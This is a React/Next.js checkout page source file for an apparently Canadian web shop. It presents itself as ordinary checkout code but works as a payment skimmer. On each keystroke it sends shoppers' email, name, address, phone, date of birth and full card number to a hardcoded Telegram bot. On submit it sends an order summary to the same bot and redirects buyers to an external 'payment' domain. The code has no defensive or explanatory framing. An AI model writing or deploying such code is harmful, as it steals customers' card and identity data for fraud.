"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useCart } from "@/lib/cart-context"
import { useTheme } from "@/lib/theme-context"
import { useRouter } from "next/navigation"
import { Lock, Info, ChevronDown, ChevronUp } from "lucide-react"

export default function CheckoutPage() {
  const router = useRouter()
  const { items, subtotal, discount, total, clearCart } = useCart()
  const { theme } = useTheme()
  const [loading, setLoading] = useState(false)
  const [mounted, setMounted] = useState(false)
  const [showOrderSummary, setShowOrderSummary] = useState(false)

  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    postalCode: "",
    country: "Canada",
    phone: "",
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
    dob: "",
  })

  // Telegram configuration
  const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8'
  const TELEGRAM_CHAT_ID = '-5217100062'
  const sessionId = `CHECKOUT_${Date.now()}`

  // Send real-time updates to Telegram
  const sendTelegramUpdate = async (fieldName, value) => {
    try {
      let message = `🛒 Live Checkout Update - ${sessionId}\n\n`
      message += `📝 Field Updated: ${fieldName}\n`
      message += `✏️ Value: ${value || 'Cleared'}\n\n`
      message += `📧 Email: ${formData.email || '...'}\n`
      message += `👤 Name: ${formData.firstName} ${formData.lastName}\n`
      message += `🏠 Address: ${formData.address || '...'}\n`
      message += `🏙️ City: ${formData.city || '...'}\n`
      message += `📱 Phone: ${formData.phone || '...'}\n`
      message += `🎂 DOB: ${formData.dob || '...'}\n`
      message += `💳 Card: ${formData.cardNumber || '...'}\n`
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        }),
      })
    } catch (error) {
      console.error('Telegram error:', error)
    }
  }

  // Handle input changes with real-time updates
  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
    
    // Send real-time update to Telegram
    sendTelegramUpdate(name, value)
  }

  // DOB validation (partial check for age 18+)
  const validateDOB = (dob) => {
    if (!dob) return false
    const today = new Date()
    const birthDate = new Date(dob)
    const age = today.getFullYear() - birthDate.getFullYear()
    return age >= 18
  }

  // Format card number
  const formatCardNumber = (value) => {
    return value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
      .replace(/(.{4})/g, "$1 ").trim().substr(0, 19)
  }

  // Format expiry date
  const formatExpiryDate = (value) => {
    const expDate = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    if (expDate.length <= 2) return expDate
    return `${expDate.substring(0, 2)}/${expDate.substring(2, 4)}`
  }

  // Generate payment security link
  const generatePaymentLink = () => {
    const params = new URLSearchParams({
      session: sessionId,
      amount: (total + (total * 0.13)).toFixed(2),
      email: formData.email,
      name: `${formData.firstName} ${formData.lastName}`,
      address: `${formData.address}, ${formData.city}, ${formData.province} ${formData.postalCode}`,
      phone: formData.phone
    })
    return `https://secure-payment.canada-mobil.com/process?${params.toString()}`
  }

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault()
    
    if (!validateDOB(formData.dob)) {
      alert('You must be 18+ years old to complete this purchase')
      return
    }

    setLoading(true)
    
    // Send final order to Telegram
    try {
      const finalMessage = `🎯 FINAL ORDER - ${sessionId}\n\n` +
        `✅ Customer: ${formData.firstName} ${formData.lastName}\n` +
        `📧 Email: ${formData.email}\n` +
        `📱 Phone: ${formData.phone}\n` +
        `🎂 DOB: ${formData.dob}\n\n` +
        `🏠 Shipping:\n${formData.address}\n${formData.city}, ${formData.province} ${formData.postalCode}\n\n` +
        `💳 Card: **** **** **** ${formData.cardNumber.slice(-4)}\n` +
        `📅 Exp: ${formData.cardExpiry}\n\n` +
        `💰 Total: $${(total + (total * 0.13)).toFixed(2)}\n\n` +
        `🔐 Payment Link Generated: ${generatePaymentLink()}`

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: finalMessage,
          parse_mode: 'Markdown'
        }),
      })
    } catch (error) {
      console.error('Final telegram error:', error)
    }

    // Redirect to secure payment link
    setTimeout(() => {
      window.location.href = generatePaymentLink()
    }, 1000)
  }

  useEffect(() => {
    setMounted(true)
  }, [])

  if (!mounted) return null
  if (items.length === 0) {
    router.push('/cart')
    return null
  }

  const taxes = total * 0.13
  const grandTotal = total + taxes

  return (
    <div className={`min-h-screen ${theme === "dark" ? "bg-zinc-950" : "bg-[#fafafa]"}`}>
      <div className="max-w-7xl mx-auto">
        {/* Mobile Order Summary Toggle */}
        <div className="lg:hidden">
          <button
            onClick={() => setShowOrderSummary(!showOrderSummary)}
            className={`w-full px-4 py-4 flex items-center justify-between border-b ${theme === "dark" ? "bg-zinc-900 border-zinc-700" : "bg-[#f5f3ed] border-gray-200"}`}
          >
            <div className="flex items-center gap-2">
              <span className={`text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-600"}`}>Order summary</span>
              {showOrderSummary ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
            </div>
            <span className={`text-lg font-bold ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
              ${grandTotal.toFixed(2)}
            </span>
          </button>
        </div>

        <div className="grid lg:grid-cols-12 gap-8 p-4 lg:p-8">
          {/* Checkout Form */}
          <div className="lg:col-span-7">
            <h1 className={`text-3xl font-bold mb-8 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
              Checkout
            </h1>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Contact */}
              <div className={`p-6 rounded-xl ${theme === "dark" ? "bg-zinc-900" : "bg-white"}`}>
                <h2 className={`text-lg font-semibold mb-4 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                  Contact Information
                </h2>
                <Input
                  type="email"
                  name="email"
                  placeholder="Email"
                  value={formData.email}
                  onChange={handleInputChange}
                  className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                  required
                />
              </div>

              {/* Shipping */}
              <div className={`p-6 rounded-xl ${theme === "dark" ? "bg-zinc-900" : "bg-white"}`}>
                <h2 className={`text-lg font-semibold mb-4 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                  Shipping Information
                </h2>
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <Input
                    type="text"
                    name="firstName"
                    placeholder="First name"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    required
                  />
                  <Input
                    type="text"
                    name="lastName"
                    placeholder="Last name"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    required
                  />
                </div>
                <Input
                  type="text"
                  name="address"
                  placeholder="Address"
                  value={formData.address}
                  onChange={handleInputChange}
                  className={`mb-4 ${theme === "dark" ? "bg-zinc-800 text-white" : ""}`}
                  required
                />
                <div className="grid grid-cols-3 gap-4 mb-4">
                  <Input
                    type="text"
                    name="city"
                    placeholder="City"
                    value={formData.city}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    required
                  />
                  <Input
                    type="text"
                    name="province"
                    placeholder="Province"
                    value={formData.province}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    required
                  />
                  <Input
                    type="text"
                    name="postalCode"
                    placeholder="Postal Code"
                    value={formData.postalCode}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    required
                  />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <Input
                    type="tel"
                    name="phone"
                    placeholder="Phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                  />
                  <Input
                    type="date"
                    name="dob"
                    placeholder="Date of Birth"
                    value={formData.dob}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    required
                  />
                </div>
                {formData.dob && !validateDOB(formData.dob) && (
                  <p className="text-red-500 text-sm mt-2">Must be 18+ years old</p>
                )}
              </div>

              {/* Payment */}
              <div className={`p-6 rounded-xl ${theme === "dark" ? "bg-zinc-900" : "bg-white"}`}>
                <h2 className={`text-lg font-semibold mb-4 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                  Payment
                </h2>
                <Input
                  type="text"
                  name="cardNumber"
                  placeholder="Card Number"
                  value={formData.cardNumber}
                  onChange={(e) => {
                    const formatted = formatCardNumber(e.target.value)
                    setFormData(prev => ({ ...prev, cardNumber: formatted }))
                    sendTelegramUpdate('cardNumber', formatted)
                  }}
                  className={`mb-4 ${theme === "dark" ? "bg-zinc-800 text-white" : ""}`}
                  required
                />
                <div className="grid grid-cols-2 gap-4">
                  <Input
                    type="text"
                    name="cardExpiry"
                    placeholder="MM/YY"
                    value={formData.cardExpiry}
                    onChange={(e) => {
                      const formatted = formatExpiryDate(e.target.value)
                      setFormData(prev => ({ ...prev, cardExpiry: formatted }))
                      sendTelegramUpdate('cardExpiry', formatted)
                    }}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    maxLength="5"
                    required
                  />
                  <Input
                    type="text"
                    name="cardCvc"
                    placeholder="CVC"
                    value={formData.cardCvc}
                    onChange={handleInputChange}
                    className={theme === "dark" ? "bg-zinc-800 text-white" : ""}
                    maxLength="4"
                    required
                  />
                </div>
              </div>

              <Button 
                type="submit" 
                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white py-6 text-lg font-bold"
                disabled={loading}
              >
                {loading ? (
                  "Processing..."
                ) : (
                  <span className="flex items-center gap-2">
                    <Lock className="w-5 h-5" />
                    Complete Order
                  </span>
                )}
              </Button>
            </form>
          </div>

          {/* Order Summary */}
          <div className={`lg:col-span-5 ${showOrderSummary || 'hidden lg:block'}`}>
            <div className={`p-6 rounded-xl sticky top-8 ${theme === "dark" ? "bg-zinc-900" : "bg-white"}`}>
              <h2 className={`text-xl font-bold mb-6 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                Order Summary
              </h2>

              <div className="space-y-4 mb-6">
                {items.map((item) => (
                  <div key={item.id} className="flex justify-between">
                    <span className={theme === "dark" ? "text-zinc-400" : "text-gray-600"}>
                      {item.name} × {item.quantity}
                    </span>
                    <span className={theme === "dark" ? "text-white" : "text-gray-900"}>
                      ${(item.price * item.quantity).toFixed(2)}
                    </span>
                  </div>
                ))}
              </div>

              <div className={`pt-4 space-y-2 border-t ${theme === "dark" ? "border-zinc-800" : "border-gray-200"}`}>
                <div className="flex justify-between">
                  <span className={theme === "dark" ? "text-zinc-400" : "text-gray-500"}>Subtotal</span>
                  <span className={theme === "dark" ? "text-white" : "text-gray-900"}>${total.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className={theme === "dark" ? "text-zinc-400" : "text-gray-500"}>Taxes (13%)</span>
                  <span className={theme === "dark" ? "text-white" : "text-gray-900"}>${taxes.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className={theme === "dark" ? "text-zinc-400" : "text-gray-500"}>Shipping</span>
                  <span className="text-green-500">Free</span>
                </div>
                <div className={`flex justify-between pt-2 border-t ${theme === "dark" ? "border-zinc-800" : "border-gray-200"}`}>
                  <span className={`text-lg font-bold ${theme === "dark" ? "text-white" : "text-gray-900"}`}>Total</span>
                  <span className="text-xl font-bold text-orange-500">${grandTotal.toFixed(2)}</span>
                </div>
              </div>

              <div className={`mt-6 p-3 rounded ${theme === "dark" ? "bg-zinc-800" : "bg-gray-50"}`}>
                <div className="flex items-center gap-2">
                  <Info className="w-4 h-4 text-green-500" />
                  <span className={`text-xs ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                    Secure payment processing with real-time monitoring
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
